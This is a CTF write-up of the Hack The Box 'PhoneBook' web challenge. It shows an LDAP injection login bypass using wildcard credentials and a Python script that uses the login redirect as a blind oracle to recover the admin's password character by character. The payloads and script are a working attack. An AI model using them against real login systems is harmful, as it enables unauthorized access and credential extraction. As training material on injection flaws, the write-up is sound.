---
layout: post
title: "PhoneBook (HTB web)"
subtitle: "ldap injection: wildcard auth bypass, then a blind oracle to rebuild the flag"
date: 2023-02-02
tags: [htb, ctf, web, ldap-injection]
category: writeups
kind: challenge
tldr: "Login was backed by LDAP and accepted user=* and pass=* as a wildcard bypass. The password field was also injectable as a blind oracle: posting the admin Reese with a partial flag plus a wildcard returned a non-failure page only when the prefix matched, so I looped characters to rebuild the flag one at a time."
---

## the challenge

The target was a plain phonebook web app sitting behind a login form. Two fields, `username` and `password`, posted to `/login`. The footer read `PhoneBook 9.8.2020`, which looked like a product-and-date string worth chasing for a CVE, but it led nowhere. The real tell was the login flow itself.

A failed login bounced me to:

```text
http://TARGET/login?message=Authentication%20failed
```

That redirect was the whole game. It gave me a stable, machine-readable signal: any submission that produced the `?message=Authentication failed` URL was a reject, and anything else was a non-reject. Two distinguishable states is all a blind oracle needs.

A successful login dropped me on a search page at a random-looking hashed path, something like `http://TARGET/964430b4cdd199af19b986eaf2193b21f32542d0/`, with a single search box.

## the bug

The login was LDAP-backed and built its filter by concatenating raw input straight into the query string. The filter looked like:

```text
(&(uid=<username>)(userPassword=<password>))
```

No escaping. In LDAP, `*` is the presence and substring wildcard, so a bare `*` in a field turns that clause into "this attribute exists with any value." Sending `*` in both fields rewrote the filter to:

```text
(&(uid=*)(userPassword=*))
```

That matches every entry that has a `uid` and a `userPassword` set, so the bind returned a result and authenticated me:

```text
user: *
pass: *
```

Once in, the search field took the same wildcard. Searching `*` dumped every record. The admin entry came back as Reese:

```text
*Reese : Kyle Reese    reese@skynet.com    555-1234567
```

The part that mattered was that the `password` field stayed injectable as a blind oracle even after I knew a valid username. Submitting `username=Reese` with a `password` of a known flag prefix followed by `*` makes the filter test a substring match against Reese's stored `userPassword`:

```text
(&(uid=Reese)(userPassword=HTB{abc*))
```

LDAP reads `HTB{abc*` as "value starts with `HTB{abc`." If Reese's password actually starts with that prefix, the entry matches and the response is the normal page. If it does not, no entry matches, the bind fails, and the response is the `Authentication failed` redirect. That is a clean prefix oracle, one comparison per request.

HTB flags always wrap in `HTB{...}`, so I seeded the known prefix with `HTB{` and extended it character by character, pinning a closing `}` after the wildcard to keep the filter shape sane. The server had no rate limit and no lockout, so I could hammer it.

## the solve

I scripted the oracle. For each candidate character I posted `username=Reese` and `password=<known>+<char>+"*}"`. The `*` after the candidate lets the rest of the stored value be anything, and the `}` is the literal flag terminator. I compared the response URL against the known failure redirect: if it did not match, the candidate extended the prefix, so I appended it and reset the character index. If the whole charset failed to extend, the flag was complete.

The charset was letters, digits, and the punctuation HTB tends to use inside flags:

```python
import requests, string

headers = {"UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"}
url = "http://TARGET/login"

chars = string.ascii_letters
chars += ''.join(['0','1','2','3','4','5','6','7','8','9','`','~','!','@','$','%','&','-','_',"'"])

counter = 0
flag = "HTB{"

while True:
    if counter == len(chars):
        print(flag + "}")
        break

    password = flag + chars[counter] + "*}"
    print("Trying: " + password)

    data = {"username": "Reese", "password": password}
    response = requests.post(url, headers=headers, data=data)

    if response.url != url + "?message=Authentication%20failed":
        flag += chars[counter]
        counter = 0
    else:
        counter += 1
```

The logic per request:

- `password = flag + chars[counter] + "*}"` builds the test prefix. With `flag = "HTB{"` and `chars[counter] = "l"` the field is `HTB{l*}`, which LDAP-filters to `userPassword=HTB{l*}` and matches only if Reese's password begins `HTB{l`.
- `response.url` is the post-redirect URL. `requests` follows the 302, so a reject lands on `...?message=Authentication%20failed` and a match lands on the search path.
- On a match, append the character and reset `counter` to 0 to start the next position from the top of the charset.
- On a miss, advance `counter` to try the next character at the same position.
- When `counter` reaches `len(chars)`, no character extended the prefix, so the flag is done and I print it with the closing brace.

Run it and it walks one position at a time:

```text
Trying: HTB{a*}
Trying: HTB{b*}
...
Trying: HTB{l*}
Trying: HTB{la*}
...
```

## the flag

The loop kept every character that extended the prefix and stopped when nothing did. The reconstructed string was the flag in the `HTB{...}` form. The whole break rested on two LDAP facts: `*` is a wildcard so `(&(uid=*)(userPassword=*))` matches anything, and a trailing `*` makes the filter a prefix test, which turns the login redirect into a one-bit oracle I could query until the flag fell out.
